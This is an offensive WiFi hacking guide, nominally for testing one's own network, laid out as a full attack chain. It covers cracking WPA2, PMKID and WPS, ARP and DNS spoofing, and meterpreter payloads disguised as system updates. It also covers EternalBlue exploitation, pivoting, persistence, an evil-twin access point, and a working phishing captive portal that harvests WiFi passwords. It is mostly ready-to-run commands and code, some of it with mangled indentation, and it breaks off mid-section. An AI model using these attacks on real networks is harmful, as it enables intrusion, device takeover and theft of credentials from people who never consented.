# 📡 Attacking WiFi From Outside — Security Research Guide
### Simulate a Real Attacker: Crack WiFi → Get Inside → Own Every Device

> **Lab Setup:** You are OUTSIDE your own WiFi network (or pretending to be).
> Goal: Get from zero access → full control of devices inside the network.
> This is exactly what a real penetration tester does.

---

## 📚 Table of Contents

1. [The Full Attack Chain — Outside to Inside](#1-the-full-attack-chain)
2. [Phase 1 — Reconnaissance From Outside](#2-phase-1-reconnaissance)
3. [Phase 2 — Crack the WiFi Password](#3-phase-2-crack-wifi-password)
4. [Phase 3 — Get Inside the Network](#4-phase-3-get-inside)
5. [Phase 4 — Scan and Map Internal Network](#5-phase-4-scan-and-map)
6. [Phase 5 — Attack Devices Inside](#6-phase-5-attack-devices)
7. [Phase 6 — Pivot and Spread](#7-phase-6-pivot-and-spread)
8. [Phase 7 — Maintain Access](#8-phase-7-maintain-access)
9. [Evil Twin Attack — Fake WiFi](#9-evil-twin-attack)
10. [Deauthentication Attacks](#10-deauthentication-attacks)
11. [PMKID Attack — No Client Needed](#11-pmkid-attack)
12. [WPS Attacks](#12-wps-attacks)
13. [Rogue DHCP — Control All Traffic](#13-rogue-dhcp)
14. [Full Automated Attack Scripts](#14-full-automated-attack-scripts)
15. [Defending Against All of This](#15-defending-against-all-of-this)
16. [Tools and Setup Reference](#16-tools-reference)

---

## 1. The Full Attack Chain

### From Outsider to Full Device Control

```
YOU (outside, no access)
│
▼
STEP 1: RECON
Scan for WiFi networks
Find your target network
Identify: channel, encryption, clients, signal strength
│
▼
STEP 2: CRACK WIFI
WPA2: Capture handshake → crack password
WPS:  Pixie Dust / brute force PIN
PMKID: No client needed → crack offline
│
▼
STEP 3: CONNECT
Join the network with cracked password
Get an IP from DHCP
Now you're "inside"
│
▼
STEP 4: INTERNAL RECON
Scan all devices on network
Find phones, laptops, IoT devices
Identify OS, open ports, running services
│
▼
STEP 5: ATTACK DEVICES
ARP poison → intercept all traffic
Exploit vulnerabilities → get shell
Deliver payload → full control
│
▼
STEP 6: POST-EXPLOITATION
Read files, camera, mic, location
Dump credentials
Install persistence
│
▼
STEP 7: COVER TRACKS
Clear logs
Remove payloads
Document findings
```

---

## 2. Phase 1 — Reconnaissance From Outside

### Enable Monitor Mode

```bash
# Check your WiFi adapter
iwconfig
iw list | grep "monitor"   # Must support monitor mode!

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0
# Creates: wlan0mon

# Verify
iwconfig wlan0mon
# Mode:Monitor  ← must show this
```

### Scan All WiFi Networks Around You

```bash
# Basic scan — see all networks
sudo airodump-ng wlan0mon

# Output columns explained:
# BSSID    = Router MAC address (your target)
# PWR      = Signal (-30 strong, -90 weak)
# Beacons  = Management frames count
# #Data    = Data packets (more = more devices active)
# #/s      = Packets per second
# CH       = WiFi channel (1-14 for 2.4GHz, 36+ for 5GHz)
# MB       = Speed
# ENC      = Encryption: OPN/WEP/WPA/WPA2/WPA3
# CIPHER   = CCMP (strong) / TKIP (weaker)
# AUTH     = PSK (home) / MGT (enterprise)
# ESSID    = Network name

# Bottom section shows connected clients:
# STATION  = Client MAC address
# BSSID    = Which AP they're connected to
# PWR      = Signal strength
# Frames   = Activity level
```

### Deep Recon on Your Target Network

```bash
# Focus on YOUR network specifically
# Replace values with your network's info:
TARGET_BSSID="AA:BB:CC:DD:EE:FF"   # Your router's MAC
TARGET_CHANNEL="6"                   # Your router's channel

# Targeted scan
sudo airodump-ng \
-c $TARGET_CHANNEL \
--bssid $TARGET_BSSID \
-w /tmp/recon_capture \
wlan0mon

# This shows:
# - Your router details
# - Every device connected to YOUR network
# - Their MAC addresses
# - Activity level
# - Save capture file for later analysis

# Identify device manufacturers from MAC
# First 3 bytes = manufacturer
# AA:BB:CC = look up at macvendors.com

# Example:
# CC:61:E5 = Apple (iPhone/iPad/Mac)
# 28:CF:E9 = Apple
# 74:DA:38 = Edimax
# 18:FE:34 = Espressif (IoT device, ESP8266)
# B4:EE:25 = Samsung
```

### Map Network Before Connecting

```python
# passive_recon.py — Passive WiFi recon without connecting
from scapy.all import *
from collections import defaultdict
import time

networks = {}
clients = defaultdict(set)

def analyze_frame(pkt):
# Management frames reveal network structure

# Beacon frames = APs advertising themselves
if pkt.haslayer(Dot11Beacon):
	bssid = pkt[Dot11].addr2
	ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
	
	if bssid not in networks:
		# Extract channel
		channel = None
		elt = pkt[Dot11Elt]
		while elt:
			if elt.ID == 3:  # DS Parameter Set = channel
				channel = ord(elt.info)
				break
				elt = elt.payload.getlayer(Dot11Elt)
				
				# Extract encryption
				enc = "OPN"
				if pkt.haslayer(Dot11EltRSN):
					enc = "WPA2"
					elif "WPA" in str(pkt[Dot11Elt:]):
					enc = "WPA"
					
					networks[bssid] = {
						'ssid': ssid,
						'channel': channel,
						'enc': enc,
						'signal': pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else 'N/A',
						'clients': set()
					}
					print(f"[AP] {ssid:<30} CH:{channel:<4} {enc:<6} BSSID:{bssid}")
					
					# Probe requests = clients looking for networks
					elif pkt.haslayer(Dot11ProbeReq):
					client_mac = pkt[Dot11].addr2
					ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
					if ssid:
						print(f"[CLIENT] {client_mac} looking for: {ssid}")
						
						# Data frames = active communication
						elif pkt.haslayer(Dot11) and pkt.type == 2:
						src = pkt[Dot11].addr2
						dst = pkt[Dot11].addr1
						bssid = pkt[Dot11].addr3
						
						# Track which clients are connected to which AP
						if bssid in networks:
							if src != bssid:
								networks[bssid]['clients'].add(src)
								if dst != bssid:
									networks[bssid]['clients'].add(dst)
									
									print("[*] Passive WiFi Recon - Listening (Ctrl+C to stop)")
									print("[*] Seeing all WiFi activity without connecting\n")
									
									sniff(iface="wlan0mon",
										  prn=analyze_frame,
			   store=0)
									```
									
									---
									
									## 3. Phase 2 — Crack the WiFi Password
									
									### WPA2 — 4-Way Handshake Method
									
									#### Step 1: Set Up Capture
									
									```bash
									# Focus on your target network
									sudo airodump-ng \
									-c 6 \
									--bssid AA:BB:CC:DD:EE:FF \
									-w /tmp/handshake \
									wlan0mon
									
									# Keep this running in background (Terminal 1)
									# Watch for: "WPA handshake: AA:BB:CC:DD:EE:FF" in top right
									```
									
									#### Step 2: Force Handshake (Deauthentication)
									
									```bash
									# Open Terminal 2
									# Send deauth packets to kick a client off
									# They immediately reconnect = handshake captured!
									
									# Deauth specific client (gentler, recommended)
									sudo aireplay-ng \
									-0 5 \
									-a AA:BB:CC:DD:EE:FF \
									-c CC:DD:EE:FF:00:11 \
									wlan0mon
									
									# -0 5     = send 5 deauth frames
									# -a       = AP MAC (your router)
									# -c       = Client MAC (your phone)
									
									# Or deauth ALL clients (more aggressive)
									sudo aireplay-ng \
									-0 10 \
									-a AA:BB:CC:DD:EE:FF \
									wlan0mon
									```
									
									#### Step 3: Verify Handshake
									
									```bash
									# Check if handshake was captured
									aircrack-ng /tmp/handshake-01.cap
									
									# Output should show:
									# 1 handshake
									# Network: YourWiFiName
									
									# Or use pyrit to check:
									pyrit -r /tmp/handshake-01.cap analyze
									```
									
									#### Step 4: Crack the Password
									
									```bash
									# Method 1: Dictionary attack with aircrack-ng
									aircrack-ng \
									-w /usr/share/wordlists/rockyou.txt \
									-b AA:BB:CC:DD:EE:FF \
									/tmp/handshake-01.cap
									
									# Method 2: Hashcat (MUCH faster, uses GPU)
									# Convert to hashcat format first
									sudo apt install hcxtools
									hcxpcapngtool -o /tmp/hash.hc22000 /tmp/handshake-01.cap
									
									# Crack with hashcat
									hashcat -m 22000 \
									/tmp/hash.hc22000 \
									/usr/share/wordlists/rockyou.txt
									
									# With rules (tries variations like Password1, passw0rd, etc.)
									hashcat -m 22000 \
									/tmp/hash.hc22000 \
									/usr/share/wordlists/rockyou.txt \
									-r /usr/share/hashcat/rules/best64.rule
									
									# Brute force (for short passwords)
									hashcat -m 22000 /tmp/hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
									# Tries all 8-digit PINs (00000000 to 99999999)
									
									# Common home WiFi password patterns
									hashcat -m 22000 /tmp/hash.hc22000 -a 3 ?u?l?l?l?l?d?d?d?d
									# Capital + 4 lower + 4 digits = "Home2024"
									
									# Method 3: Online rainbow tables (if nothing works)
									# Upload hash to: https://www.onlinehashcrack.com/
									# or: https://gpuhash.me/
									```
									
									### PMKID Attack — No Client Needed!
									
									PMKID attack is better than handshake — you don't need to wait for a client to connect:
									
									```bash
									# Install hcxtools
									sudo apt install hcxtools hcxdumptool
									
									# Step 1: Capture PMKID
									# Stop any other capture first
									sudo airmon-ng stop wlan0mon
									
									# Use hcxdumptool to capture PMKID
									sudo hcxdumptool \
									-i wlan0 \
									-o /tmp/pmkid_capture.pcapng \
									--enable_status=1
									
									# Let it run for 2-3 minutes
									# It sends probe requests and captures PMKIDs automatically
									
									# Or target a specific AP:
									sudo hcxdumptool \
									-i wlan0 \
									-o /tmp/pmkid_capture.pcapng \
									--filterlist_ap=/tmp/target.txt \
									--filtermode=2
									# target.txt contains your AP's MAC: AA:BB:CC:DD:EE:FF
									
									# Step 2: Convert to hashcat format
									hcxpcapngtool \
									-o /tmp/pmkid.hc22000 \
									/tmp/pmkid_capture.pcapng
									
									# Step 3: Check if PMKID was captured
									cat /tmp/pmkid.hc22000
									# Should have content — each line is a crackable hash
									
									# Step 4: Crack with hashcat (same as WPA2 handshake!)
									hashcat -m 22000 \
									/tmp/pmkid.hc22000 \
									/usr/share/wordlists/rockyou.txt
									
									# GPU cracking speeds:
									# GTX 1080: ~500,000 passwords/second for WPA2
									# RTX 3090: ~1,200,000 passwords/second
									```
									
									### WPS Attack
									
									Many routers have WPS enabled — vulnerable to PIN brute force:
									
									```bash
									# Step 1: Find WPS-enabled networks
									sudo wash -i wlan0mon
									
									# Output:
									# BSSID              Ch  dBm  WPS  Lck  ESSID
									# AA:BB:CC:DD:EE:FF   6  -45  2.0  No   YourWiFi
									#                                   ↑
									#                    "No" = NOT locked = vulnerable!
									
									# Step 2: Pixie Dust attack (fast, works on many routers)
									sudo reaver \
									-i wlan0mon \
									-b AA:BB:CC:DD:EE:FF \
									-K 1 \
									-vvv
									
									# -K 1 = Pixie Dust mode
									# Works on: many TP-Link, Netgear, D-Link, Asus routers
									# Takes: seconds to minutes if vulnerable
									
									# Step 3: Standard WPS brute force (if Pixie Dust fails)
									sudo reaver \
									-i wlan0mon \
									-b AA:BB:CC:DD:EE:FF \
									-vvv \
									-N \
									--no-nacks
									
									# Takes: 4-10 hours but recovers FULL password, not just PIN!
									
									# Step 4: If locked, try to unlock
									sudo reaver \
									-i wlan0mon \
									-b AA:BB:CC:DD:EE:FF \
									-vvv \
									-L    # Ignore locked state
									
									# Bully - alternative to reaver
									sudo bully wlan0mon \
									-b AA:BB:CC:DD:EE:FF \
									-d \
									-v 3
									```
									
									### WEP Cracking (Old Networks)
									
									WEP is completely broken — cracks in minutes:
									
									```bash
									# Capture WEP traffic
									sudo airodump-ng \
									-c 6 \
									--bssid AA:BB:CC:DD:EE:FF \
									-w /tmp/wep_capture \
									wlan0mon
									
									# Inject packets to generate more IVs (speeds up cracking)
									sudo aireplay-ng \
									-3 \
									-b AA:BB:CC:DD:EE:FF \
									-h YOUR_MAC \
									wlan0mon
									
									# Crack when you have 5000+ IVs
									aircrack-ng /tmp/wep_capture-01.cap
									
									# WEP cracks in seconds with enough IVs
									```
									
									---
									
									## 4. Phase 3 — Get Inside the Network
									
									### Connect to Network with Cracked Password
									
									```bash
									# Stop monitor mode
									sudo airmon-ng stop wlan0mon
									
									# Method 1: nmcli (Network Manager)
									nmcli device wifi connect "YourWiFiName" password "crackedpassword"
									
									# Method 2: wpa_supplicant (manual)
									cat > /tmp/wifi.conf << EOF
									network={
										ssid="YourWiFiName"
										psk="crackedpassword"
										key_mgmt=WPA-PSK
									}
									EOF
									
									sudo wpa_supplicant -i wlan0 -c /tmp/wifi.conf -B
									sudo dhclient wlan0   # Get IP from DHCP
									
									# Method 3: iwconfig (older method)
									sudo iwconfig wlan0 essid "YourWiFiName"
									sudo wpa_passphrase "YourWiFiName" "crackedpassword" | \
									sudo wpa_supplicant -i wlan0 -D wext -c /dev/stdin -B
									sudo dhclient wlan0
									
									# Verify connection
									ip addr show wlan0
									# Should show: inet 192.168.1.XXX/24
									
									# Test connectivity
									ping 192.168.1.1
									curl ifconfig.me   # See your external IP (should be router's)
									```
									
									### Spoof Your MAC Address (Stay Stealthy)
									
									```bash
									# Change MAC before connecting
									# This hides your real device identity from router logs
									
									# Stop interface
									sudo ip link set wlan0 down
									
									# Set random MAC
									sudo macchanger -r wlan0
									
									# Or set specific MAC
									sudo macchanger -m AA:BB:CC:11:22:33 wlan0
									
									# Start interface
									sudo ip link set wlan0 up
									
									# Verify
									macchanger -s wlan0
									ip link show wlan0
									
									# Now connect with spoofed MAC
									nmcli device wifi connect "YourWiFiName" password "password"
									```
									
									---
									
									## 5. Phase 4 — Scan and Map Internal Network
									
									### Discover Everything on the Network
									
									```bash
									# Find your IP and subnet
									ip addr show wlan0
									# e.g., 192.168.1.150/24
									
									# Quick host discovery
									sudo nmap -sn 192.168.1.0/24
									
									# Full scan of all live hosts
									sudo nmap -A -T4 192.168.1.0/24
									
									# What each flag does:
									# -sn  = ping scan only (no port scan)
									# -A   = OS detection + version + scripts + traceroute
									# -T4  = fast timing
									# -p-  = scan ALL 65535 ports
									
									# Scan specific device thoroughly
									sudo nmap -A -p- -T4 192.168.1.105
									
									# Find specific services across network
									sudo nmap -p 80,443,22,23,8080,8443,5555 192.168.1.0/24
									
									# Scan for vulnerabilities
									sudo nmap --script vuln 192.168.1.105
									
									# OS fingerprinting
									sudo nmap -O 192.168.1.105
									```
									
									### Advanced Network Mapping
									
									```python
									# network_mapper.py — Build complete picture of network
									import subprocess
									import json
									import re
									from xml.etree import ElementTree
									
									def full_network_scan(subnet="192.168.1.0/24"):
									"""Run comprehensive network scan"""
									
									print(f"[*] Scanning {subnet}...")
									
									# Run nmap with XML output
									cmd = [
										"sudo", "nmap",
"-sV",          # Service version detection
"-O",           # OS detection
"--script", "banner,http-title,ssh-hostkey,smb-os-discovery",
"-oX", "-",     # XML output to stdout
"-T4",
subnet
									]
									
									result = subprocess.run(cmd, capture_output=True, text=True)
									root = ElementTree.fromstring(result.stdout)
									
									devices = []
									
									for host in root.findall('host'):
										if host.find('status').get('state') != 'up':
											continue
											
											device = {
												'ip': None,
												'mac': None,
												'vendor': None,
												'hostname': None,
												'os': None,
												'ports': [],
												'device_type': None
											}
											
											# Get IP and MAC
											for addr in host.findall('address'):
												if addr.get('addrtype') == 'ipv4':
													device['ip'] = addr.get('addr')
													elif addr.get('addrtype') == 'mac':
													device['mac'] = addr.get('addr')
													device['vendor'] = addr.get('vendor', 'Unknown')
													
													# Get hostname
													hostnames = host.find('hostnames')
													if hostnames is not None:
														hn = hostnames.find('hostname')
														if hn is not None:
															device['hostname'] = hn.get('name')
															
															# Get OS
															os_el = host.find('os')
															if os_el is not None:
																osmatch = os_el.find('osmatch')
																if osmatch is not None:
																	device['os'] = osmatch.get('name')
																	
																	# Get ports
																	ports_el = host.find('ports')
																	if ports_el is not None:
																		for port in ports_el.findall('port'):
																			state = port.find('state')
																			if state is not None and state.get('state') == 'open':
																				service = port.find('service')
																				port_info = {
																					'port': int(port.get('portid')),
																					'protocol': port.get('protocol'),
																					'service': service.get('name') if service else 'unknown',
																					'version': service.get('version', '') if service else ''
																				}
																				device['ports'].append(port_info)
																				
																				# Guess device type
																				device['device_type'] = guess_device_type(device)
																				
																				devices.append(device)
																				print_device(device)
																				
																				return devices
																				
																				def guess_device_type(device):
																				"""Guess what type of device this is"""
																				vendor = (device.get('vendor') or '').lower()
																				os = (device.get('os') or '').lower()
																				ports = [p['port'] for p in device.get('ports', [])]
																				hostname = (device.get('hostname') or '').lower()
																				
																				if any(v in vendor for v in ['apple', 'iphone', 'ipad']):
																					return '📱 Apple Device (iPhone/iPad/Mac)'
																					if any(v in vendor for v in ['samsung']):
																						return '📱 Samsung Device'
																						if any(v in vendor for v in ['tp-link', 'netgear', 'asus', 'd-link', 'linksys']):
																							return '📡 Router/AP'
																							if any(v in vendor for v in ['espressif', 'esp']):
																								return '🔌 IoT Device (ESP8266/ESP32)'
																								if 'android' in os or 5555 in ports:
																									return '📱 Android Device'
																									if 'windows' in os:
																										return '💻 Windows PC/Laptop'
																										if 'linux' in os:
																											return '🖥 Linux Device'
																											if 80 in ports or 443 in ports:
																												return '🌐 Web Device'
																												return '❓ Unknown Device'
																												
																												def print_device(d):
																												print(f"\n{'='*55}")
																												print(f"IP:     {d['ip']}")
																												print(f"MAC:    {d['mac']} ({d['vendor']})")
																												print(f"OS:     {d['os']}")
																												print(f"Type:   {d['device_type']}")
																												if d['ports']:
																													print(f"Ports:  ", end='')
																													for p in d['ports']:
																														print(f"{p['port']}/{p['service']}", end='  ')
																														print()
																														
																														devices = full_network_scan()
																														print(f"\n[+] Found {len(devices)} devices")
																														
																														# Save results
																														with open('/tmp/network_map.json', 'w') as f:
																														json.dump(devices, f, indent=2, default=str)
																														print("[+] Saved to /tmp/network_map.json")
																														```
																														
																														---
																														
																														## 6. Phase 5 — Attack Devices Inside
																														
																														### Set Up ARP Poisoning First
																														
																														Once inside, ARP poison to intercept all traffic:
																														
																														```bash
																														# Enable IP forwarding (traffic passes through you)
																														echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
																														
																														# ARP poison your phone (target)
																														# Terminal 1:
																														sudo arpspoof -i wlan0 -t 192.168.1.105 192.168.1.1
																														
																														# Terminal 2:
																														sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.105
																														
																														# Now all traffic from 192.168.1.105 flows through you!
																														```
																														
																														### Deliver Payload to Phone
																														
																														```bash
																														# Step 1: Create payload
																														msfvenom -p android/meterpreter/reverse_tcp \
																														LHOST=192.168.1.150 \
																														LPORT=4444 \
																														-o /tmp/SystemUpdate.apk
																														
																														# Step 2: Set up listener
																														msfconsole -q -x "
																														use exploit/multi/handler;
																														set PAYLOAD android/meterpreter/reverse_tcp;
																														set LHOST 192.168.1.150;
																														set LPORT 4444;
																														set ExitOnSession false;
																														run -j"
																														
																														# Step 3: Host the payload
																														cd /tmp && python3 -m http.server 8080
																														
																														# Step 4: DNS Spoof the phone
																														# Make any HTTP request from phone go to your server
																														# Using bettercap:
																														sudo bettercap -iface wlan0 -eval "
																														set arp.spoof.targets 192.168.1.105;
																														arp.spoof on;
																														set dns.spoof.all true;
																														set dns.spoof.address 192.168.1.150;
																														dns.spoof on;
																														net.sniff on"
																														
																														# Now when phone tries to visit any HTTP site or update URL
																														# → Redirected to your server
																														# → Downloads your payload APK
																														```
																														
																														### Inject Payload Into HTTP Downloads
																														
																														```bash
																														# Using bettercap to inject payload into any HTTP download
																														sudo bettercap -iface wlan0
																														
																														# In bettercap:
																														set arp.spoof.targets 192.168.1.105
																														arp.spoof on
																														
																														# JavaScript injection into web pages
																														set http.proxy.injectjs http://192.168.1.150/hook.js
																														http.proxy on
																														```
																														
																														```javascript
																														// hook.js — inject into every webpage target visits
																														(function() {
																															// Show fake update popup
																															var div = document.createElement('div');
																															div.innerHTML = `
																															<div style="position:fixed;top:0;left:0;width:100%;height:100%;
																															background:rgba(0,0,0,0.8);z-index:99999;
																															display:flex;align-items:center;justify-content:center;">
																															<div style="background:white;padding:30px;border-radius:10px;
																															text-align:center;max-width:300px;">
																															<h2>⚠️ Security Update</h2>
																															<p>Critical security update available.</p>
																															<a href="http://192.168.1.150:8080/SystemUpdate.apk"
																															style="background:#007bff;color:white;padding:10px 20px;
																															text-decoration:none;border-radius:5px;display:block;
																															margin-top:15px;">
																															Install Update
																															</a>
																															</div>
																															</div>
																															`;
																															document.body.appendChild(div);
																														})();
																														```
																														
																														### Direct Exploitation with Metasploit
																														
																														```bash
																														# Scan for vulnerabilities on specific device
																														sudo nmap --script vuln 192.168.1.105
																														
																														# Android with ADB exposed (port 5555)
																														# Check if ADB is exposed:
																														nmap -p 5555 192.168.1.105
																														
																														# If open:
																														use exploit/multi/handler
																														# or just connect directly:
																														adb connect 192.168.1.105:5555
																														adb shell   # Direct shell access!
																														
																														# Windows SMB vulnerabilities
																														use auxiliary/scanner/smb/smb_ms17_010
																														set RHOSTS 192.168.1.0/24
																														run
																														
																														# If vulnerable:
																														use exploit/windows/smb/ms17_010_eternalblue
																														set RHOSTS 192.168.1.106
																														set PAYLOAD windows/x64/meterpreter/reverse_tcp
																														set LHOST 192.168.1.150
																														set LPORT 4445
																														run
																														
																														# Router vulnerabilities
																														# Check router admin page:
																														curl -s http://192.168.1.1/ | head -20
																														# Check default credentials:
																														use auxiliary/scanner/http/router_default_creds
																														set RHOSTS 192.168.1.1
																														run
																														```
																														
																														---
																														
																														## 7. Phase 6 — Pivot and Spread
																														
																														Pivoting means using one compromised device to attack others.
																														
																														### Using Meterpreter as a Pivot
																														
																														```bash
																														# You have session 1 (the phone: 192.168.1.105)
																														# Use it to reach other devices
																														
																														# In meterpreter session 1:
																														route add 192.168.1.0/24 1   # Route traffic through session 1
																														
																														# Now Metasploit scans go THROUGH the phone
																														use auxiliary/scanner/portscan/tcp
																														set RHOSTS 192.168.1.0/24
																														set PORTS 22,80,443,445,3389
																														run
																														
																														# You're scanning the network FROM the phone's perspective!
																														# Can reach devices the phone can reach
																														```
																														
																														### Port Forwarding Through Session
																														
																														```bash
																														# Forward a port through compromised device
																														# Access the router's admin panel through the phone:
																														
																														# In meterpreter:
																														portfwd add -l 8080 -p 80 -r 192.168.1.1
																														# Now: http://127.0.0.1:8080 → goes through phone → router admin!
																														
																														# Access target computer's RDP through phone:
																														portfwd add -l 3389 -p 3389 -r 192.168.1.106
																														# Connect RDP to: 127.0.0.1:3389 → tunneled through phone
																														```
																														
																														---
																														
																														## 8. Phase 7 — Maintain Access
																														
																														### Maintain Access Even After WiFi Password Changes
																														
																														```bash
																														# Install backdoor that reconnects to you
																														# On Android (via Meterpreter):
																														run post/android/manage/install_apk \
																														PATH=/sdcard/Download/SystemServices.apk
																														
																														# On Windows (via Meterpreter):
																														run post/windows/manage/persistence_exe \
																														STARTUP=REGISTRY \
																														EXE_NAME=WindowsUpdate.exe \
																														SESSION=1
																														
																														# Custom listener that accepts connections from anywhere:
																														use exploit/multi/handler
																														set PAYLOAD android/meterpreter/reverse_tcp
																														set LHOST 0.0.0.0   # Accept from any IP
																														set LPORT 4444
																														set ExitOnSession false
																														run -j
																														```
																														
																														---
																														
																														## 9. Evil Twin Attack — Fake WiFi
																														
																														Create a fake WiFi network with the same name as the real one. Devices connect to yours instead.
																														
																														### How Evil Twin Works
																														
																														```
																														Real Network:    YourWiFi  AA:BB:CC:DD:EE:FF  CH:6
																														↑
																														Evil Twin:       YourWiFi  YOUR_MAC           CH:6
																														(same name, your MAC, stronger signal)
																														
																														Steps:
																														1. You create identical AP with stronger signal
																														2. Send deauth packets to kick clients off real AP
																														3. Clients reconnect, pick strongest signal = yours
																														4. They're now connected to YOUR fake AP
																														5. All their traffic goes through you!
																														6. Show them fake captive portal to steal WiFi password
																														```
																														
																														### Set Up Evil Twin with Hostapd
																														
																														```bash
																														# Install required tools
																														sudo apt install hostapd dnsmasq
																														
																														# Create hostapd config (fake AP)
																														cat > /tmp/evil_twin.conf << EOF
																														interface=wlan1          # Second WiFi adapter for fake AP
																														driver=nl80211
																														ssid=YourWiFiName        # SAME name as real network
																														channel=6                # SAME channel
																														hw_mode=g
																														EOF
																														
																														# Create dnsmasq config (DHCP + DNS for clients)
																														cat > /tmp/dnsmasq.conf << EOF
																														interface=wlan1
																														dhcp-range=192.168.2.100,192.168.2.200,255.255.255.0,12h
																														dhcp-option=3,192.168.2.1
																														dhcp-option=6,192.168.2.1
																														server=8.8.8.8
																														log-queries
																														log-facility=/tmp/dns_queries.log
																														address=/#/192.168.2.1    # All DNS → your machine (captive portal)
																														EOF
																														
																														# Set up IP for fake AP interface
																														sudo ip addr add 192.168.2.1/24 dev wlan1
																														sudo ip link set wlan1 up
																														
																														# Enable IP forwarding
																														echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
																														
																														# NAT — forward traffic to internet through real connection
																														sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
																														sudo iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
																														
																														# Start fake AP
																														sudo hostapd /tmp/evil_twin.conf &
																														
																														# Start DHCP/DNS
																														sudo dnsmasq -C /tmp/dnsmasq.conf -d &
																														
																														# Now kick clients off real AP (they'll connect to yours!)
																														sudo airmon-ng start wlan0
																														sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon &
																														# -0 0 = send deauths continuously
																														```
																														
																														### Captive Portal — Steal WiFi Password
																														
																														```python
																														# captive_portal.py — Fake login page to capture WiFi password
																														from flask import Flask, request, render_template_string, redirect
																														import datetime
																														
																														app = Flask(__name__)
																														captured_passwords = []
																														
																														PORTAL_HTML = """
																														<!DOCTYPE html>
																														<html>
																														<head>
																														<meta name="viewport" content="width=device-width, initial-scale=1">
																														<title>WiFi Login</title>
																														<style>
																														* { box-sizing: border-box; margin: 0; padding: 0; }
																														body {
																															font-family: -apple-system, sans-serif;
																															background: linear-gradient(135deg, #667eea, #764ba2);
																															min-height: 100vh;
																															display: flex;
																															align-items: center;
																															justify-content: center;
																														}
																														.card {
																															background: white;
																															padding: 40px;
																															border-radius: 15px;
																															width: 90%;
																															max-width: 400px;
																															box-shadow: 0 20px 60px rgba(0,0,0,0.3);
																														}
																														.logo { text-align: center; margin-bottom: 20px; font-size: 40px; }
																														h2 { text-align: center; margin-bottom: 5px; color: #333; }
																														p { text-align: center; color: #666; margin-bottom: 25px; font-size: 14px; }
																														input {
																															width: 100%;
																															padding: 12px;
																															border: 2px solid #e0e0e0;
																															border-radius: 8px;
																															font-size: 16px;
																															margin-bottom: 15px;
																															outline: none;
																														}
																														input:focus { border-color: #667eea; }
																														button {
																															width: 100%;
																															padding: 14px;
																															background: linear-gradient(135deg, #667eea, #764ba2);
																															color: white;
																															border: none;
																															border-radius: 8px;
																															font-size: 16px;
																															cursor: pointer;
																														}
																														.error { color: red; text-align: center; margin-top: 10px; font-size: 14px; }
																														</style>
																														</head>
																														<body>
																														<div class="card">
																														<div class="logo">📡</div>
																														<h2>WiFi Authentication</h2>
																														<p>Session expired. Please enter your WiFi password to reconnect.</p>
																														<form method="POST" action="/login">
																														<input type="text" name="network" value="{{ network }}" readonly
																														style="background:#f5f5f5; color:#666;">
																														<input type="password" name="password"
																														placeholder="WiFi Password" required autofocus>
																														<button type="submit">Connect</button>
																														</form>
																														{% if error %}
																														<p class="error">❌ Incorrect password. Please try again.</p>
																														{% endif %}
																														</div>
																														</body>
																														</html>
																														"""
																														
																														attempt_count = {}
																														
																														@app.route('/', defaults={'path': ''})
																														@app.route('/<path:path>')
																														def catch_all(path):
																														client_ip = request.remote_addr
																														attempt_count[client_ip] = attempt_count.get(client_ip, 0)
																														return render_template_string(PORTAL_HTML,
																																					  network="YourWiFiName",
															error=False)
																														
																														@app.route('/login', methods=['POST'])
																														def login():
																														password = request.form.get('password', '')
																														client_ip = request.remote_addr
																														timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
																														
																														print(f"\n{'='*50}")
																														print(f"[+] PASSWORD CAPTURED!")
																														print(f"    Time:     {timestamp}")
																														print(f"    Client:   {client_ip}")
																														print(f"    Password: {password}")
																														print(f"{'='*50}\n")
																														
																														# Save to file
																														with open('/tmp/captured_passwords.txt', 'a') as f:
																														f.write(f"{timestamp} | {client_ip} | {password}\n")
																														
																														captured_passwords.append({
																															'time': timestamp,
																															'ip': client_ip,
																															'password': password
																														})
																														
																														# Show error to make it look wrong (get them to try again)
																														attempt_count[client_ip] = attempt_count.get(client_ip, 0) + 1
																														
																														if attempt_count[client_ip] >= 2:
																															# After 2 attempts, "connect" them (give internet access)
																															# This makes it look real
																															return redirect('http://www.google.com')
																															
																															return render_template_string(PORTAL_HTML,
																																						  network="YourWiFiName",
															 error=True)
																															
																															if __name__ == '__main__':
																																print("[*] Captive Portal running on port 80")
																																print("[*] Waiting for clients to enter WiFi password...")
																																app.run(host='0.0.0.0', port=80, debug=False)
																																```
																																
																																### Automated Evil Twin with Airgeddon
																																
																																```bash
																																# Airgeddon automates the entire evil twin process
																																sudo apt install airgeddon
																																# or:
																																git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
																																cd airgeddon
																																sudo bash airgeddon.sh
																																
																																# Menu:
																																# 7) Evil Twin attacks menu
																																#   1) Evil Twin AP attack (no HTTPS)
																																#   2) Evil Twin AP attack (HTTPS)
																																#   9) Evil Twin AP attack (Captive portal)  ← Best option
																																
																																# Airgeddon:
																																# - Creates the fake AP automatically
																																# - Sets up DHCP/DNS
																																# - Deauths clients from real AP
																																# - Shows captive portal
																																# - Captures and displays the password
																																# - ALL IN ONE TOOL!
																																```
																																
																																---
																																
																																## 10. Deauthentication Attacks
																																
																																Force any device to disconnect from WiFi.
																																
																																```bash
																																# Deauth a single device
																																sudo aireplay-ng \
																																-0 10 \
																																-a AA:BB:CC:DD:EE:FF \   # Router MAC
																																-c CC:DD:EE:FF:00:11 \   # Target device MAC
																																wlan0mon
																																
																																# Deauth ALL devices from a network
																																sudo aireplay-ng \
																																-0 0 \
																																-a AA:BB:CC:DD:EE:FF \
																																wlan0mon
																																# -0 0 = send continuously until you stop
																																
																																# MDK4 — more powerful deauth (harder to block)
																																sudo apt install mdk4
																																
																																# Deauth attack on specific BSSID
																																sudo mdk4 wlan0mon d \
																																-B AA:BB:CC:DD:EE:FF
																																
																																# Beacon flood (fill airspace with fake APs)
